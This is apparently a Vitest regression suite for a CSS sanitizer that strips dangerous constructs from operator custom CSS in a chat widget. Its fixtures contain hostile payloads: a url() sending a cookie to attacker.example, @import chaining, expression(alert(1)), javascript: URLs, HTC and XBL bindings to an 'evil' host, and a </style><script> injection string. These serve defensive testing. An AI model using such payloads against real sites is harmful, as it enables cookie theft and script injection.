import { describe, it, expect } from 'vitest'
import { sanitizeCustomCss } from '../src/lib/css-sanitize'

/**
 * P1-21 regression suite — operator custom CSS sanitization.
 *
 * Threats the sanitizer defends against (each has at least one regression
 * test below):
 *   - background: url("http://attacker.example/?cookie=...") exfil
 *   - @import url("...") chained-stylesheet attacks
 *   - expression(alert(1)) IE-era JS-in-CSS
 *   - </style><script>...</script> HTML smuggling via angle brackets
 *   - javascript: scheme in any value
 *   - filter:progid: IE attack vector
 *   - behavior: HTC injection
 *   - -moz-binding XBL injection
 *
 * Sanitizer policy (intentionally conservative):
 *   - url(...) is rewritten to url(about:blank) UNLESS the target is data:
 *     or https://fonts.{gstatic,googleapis}.com (the only allowed CDN).
 *   - Dangerous at-rules (@import, @charset, @namespace, @document) are
 *     stripped entirely.
 *   - Angle brackets are stripped (CSS doesn't legitimately need them and
 *     they're the primary route for </style><script> smuggling).
 *   - Length cap at 64KB.
 *
 * What's NOT sanitized:
 *   - Property names (any property allowed)
 *   - Color/length/identifier values (any allowed)
 *   - position: fixed / z-index abuse (clickjacking) — out of scope here;
 *     the iframe-boundary on the chat widget mitigates, but CSS-only
 *     defense against this requires parser-level rule rewriting.
 */

describe('sanitizeCustomCss — happy path', () => {
  it('passes normal CSS through unchanged', () => {
    const input = '.rbot-widget-bubble { color: #6B7F5E; border-radius: 8px; }'
    const r = sanitizeCustomCss(input)
    expect(r.css).toBe(input)
    expect(r.warnings).toEqual([])
  })

  it('preserves CSS variables and calc()', () => {
    const input = ':root { --rbot-primary: hsl(120 30% 40%); padding: calc(1rem + 4px); }'
    const r = sanitizeCustomCss(input)
    expect(r.css).toBe(input)
    expect(r.warnings).toEqual([])
  })

  it('passes Google Fonts url() through (allowlisted)', () => {
    const input = "body { font-family: 'Lato'; src: url('https://fonts.gstatic.com/lato.woff2'); }"
    const r = sanitizeCustomCss(input)
    expect(r.css).toContain('https://fonts.gstatic.com/lato.woff2')
    // No warnings about url-rewritten because the target was allowlisted.
    const rewriteWarnings = r.warnings.filter(w => w.kind === 'url-rewritten-to-about-blank')
    expect(rewriteWarnings).toEqual([])
  })

  it('passes data: URIs through (no network = no exfil)', () => {
    const input = '.icon { background-image: url(data:image/png;base64,iVBORw0KGgo); }'
    const r = sanitizeCustomCss(input)
    expect(r.css).toContain('data:image/png;base64,iVBORw0KGgo')
  })
})

describe('sanitizeCustomCss — url() exfil defense', () => {
  it('rewrites attacker-hosted url() to about:blank', () => {
    const input = 'body { background: url("https://attacker.example/?cookie=stolen"); }'
    const r = sanitizeCustomCss(input)
    expect(r.css).not.toContain('attacker.example')
    expect(r.css).toContain('about:blank')
    expect(r.warnings.find(w => w.kind === 'url-rewritten-to-about-blank')?.count).toBe(1)
  })

  it('rewrites http:// url() even on allowlisted host (only https:// is allowed)', () => {
    const input = '.x { background: url("http://fonts.gstatic.com/lato.woff2"); }'
    const r = sanitizeCustomCss(input)
    expect(r.css).not.toContain('http://')
    expect(r.css).toContain('about:blank')
  })

  it('rewrites raw IP url()', () => {
    const input = '.x { background: url("https://1.2.3.4/png"); }'
    const r = sanitizeCustomCss(input)
    expect(r.css).toContain('about:blank')
  })

  it('rewrites url() with no scheme (relative URL — could pick up attacker host depending on page origin)', () => {
    const input = '.x { background: url("evil.gif"); }'
    const r = sanitizeCustomCss(input)
    expect(r.css).toContain('about:blank')
    expect(r.css).not.toContain('evil.gif')
  })

  it('handles single-quoted, double-quoted, and unquoted url()', () => {
    const input = `
      a { background: url('https://attacker.example/a.png'); }
      b { background: url("https://attacker.example/b.png"); }
      c { background: url(https://attacker.example/c.png); }
    `
    const r = sanitizeCustomCss(input)
    expect(r.css.match(/attacker\.example/g)).toBeNull()
    expect(r.css.match(/about:blank/g)?.length).toBe(3)
  })
})

describe('sanitizeCustomCss — at-rule stripping', () => {
  it('strips @import (single-line form)', () => {
    const input = "@import url('https://attacker.example/chain.css'); body { color: red; }"
    const r = sanitizeCustomCss(input)
    expect(r.css).not.toContain('@import')
    expect(r.css).toContain('body { color: red; }')
    expect(r.warnings.find(w => w.kind === 'at-import-stripped')?.count).toBe(1)
  })

  it('strips @charset', () => {
    const input = '@charset "UTF-8"; .x { color: red; }'
    const r = sanitizeCustomCss(input)
    expect(r.css).not.toContain('@charset')
  })

  it('strips @namespace', () => {
    const input = "@namespace svg url('http://www.w3.org/2000/svg'); g { fill: red; }"
    const r = sanitizeCustomCss(input)
    expect(r.css).not.toContain('@namespace')
  })

  it('strips Firefox @document blocks', () => {
    // @document is Firefox-only but has been used in adblock bypass attacks.
    const input = "@document url('http://example.com') { body { display: none; } } .x { color: red; }"
    const r = sanitizeCustomCss(input)
    expect(r.css).not.toContain('@document')
    expect(r.css).toContain('.x')
  })

  it('preserves @media, @supports, @keyframes, @font-face (legitimate at-rules)', () => {
    const input = `
      @media (max-width: 600px) { .x { padding: 8px; } }
      @supports (display: grid) { .y { display: grid; } }
      @keyframes fade { 0% { opacity: 0; } 100% { opacity: 1; } }
      @font-face { font-family: 'Foo'; src: url(data:font/woff2;base64,XYZ); }
    `
    const r = sanitizeCustomCss(input)
    expect(r.css).toContain('@media')
    expect(r.css).toContain('@supports')
    expect(r.css).toContain('@keyframes')
    expect(r.css).toContain('@font-face')
  })
})

describe('sanitizeCustomCss — JS-in-CSS attacks', () => {
  it('strips expression(...)', () => {
    const input = '.x { width: expression(alert(1)); color: red; }'
    const r = sanitizeCustomCss(input)
    expect(r.css).not.toContain('expression')
    expect(r.css).not.toContain('alert(1)')
    expect(r.css).toContain('color: red')
    expect(r.warnings.find(w => w.kind === 'expression-stripped')?.count).toBe(1)
  })

  it('strips javascript: scheme inside url()', () => {
    const input = "a { background: url('javascript:alert(1)'); }"
    const r = sanitizeCustomCss(input)
    expect(r.css).not.toMatch(/javascript:/i)
  })

  it('strips javascript: scheme outside url() (defense-in-depth)', () => {
    const input = ".x { cursor: javascript:alert(1); }"
    const r = sanitizeCustomCss(input)
    expect(r.css).not.toMatch(/javascript:/i)
  })

  it('strips behavior: HTC injection (IE legacy)', () => {
    const input = '.x { behavior: url("http://evil/foo.htc"); }'
    const r = sanitizeCustomCss(input)
    expect(r.css).not.toContain('behavior:')
  })

  it('strips -moz-binding XBL injection (Firefox legacy)', () => {
    const input = ".x { -moz-binding: url('http://evil/bind.xml'); }"
    const r = sanitizeCustomCss(input)
    expect(r.css).not.toContain('-moz-binding')
  })

  it('strips filter:progid IE attack', () => {
    const input = '.x { filter: progid:DXImageTransform.Microsoft.Gradient(startColorstr=red); }'
    const r = sanitizeCustomCss(input)
    expect(r.css).not.toContain('filter: progid')
  })
})

describe('sanitizeCustomCss — angle bracket smuggling', () => {
  it('strips < and > outright (kills </style><script> injection)', () => {
    // The attack: an operator pastes CSS that includes literal </style> to
    // close the style block early, then opens a <script> tag for XSS. The
    // widget would have just inlined this verbatim.
    const input = '.x { color: red; } </style><script>alert(1)</script>'
    const r = sanitizeCustomCss(input)
    expect(r.css).not.toContain('<')
    expect(r.css).not.toContain('>')
    expect(r.warnings.find(w => w.kind === 'angle-brackets-stripped')).toBeDefined()
  })
})

describe('sanitizeCustomCss — length cap', () => {
  it('rejects CSS over 64KB outright', () => {
    const input = 'a { color: red; } '.repeat(5000) // ~85KB
    const r = sanitizeCustomCss(input)
    expect(r.css).toBe('')
    expect(r.warnings.find(w => w.kind === 'too-long')).toBeDefined()
  })

  it('accepts CSS up to 64KB', () => {
    const input = 'a { color: red; } '.repeat(3000) // ~51KB
    const r = sanitizeCustomCss(input)
    expect(r.css.length).toBeGreaterThan(0)
    expect(r.warnings.find(w => w.kind === 'too-long')).toBeUndefined()
  })
})

describe('sanitizeCustomCss — input validation', () => {
  it('rejects non-string input', () => {
    // @ts-expect-error — runtime type check
    const r1 = sanitizeCustomCss(null)
    expect(r1.css).toBe('')
    expect(r1.warnings[0].kind).toBe('non-string-input')

    // @ts-expect-error
    const r2 = sanitizeCustomCss(42)
    expect(r2.css).toBe('')
  })

  it('returns empty result for empty input (legitimate "clear my CSS" case)', () => {
    const r = sanitizeCustomCss('')
    expect(r.css).toBe('')
    expect(r.warnings).toEqual([])
  })
})
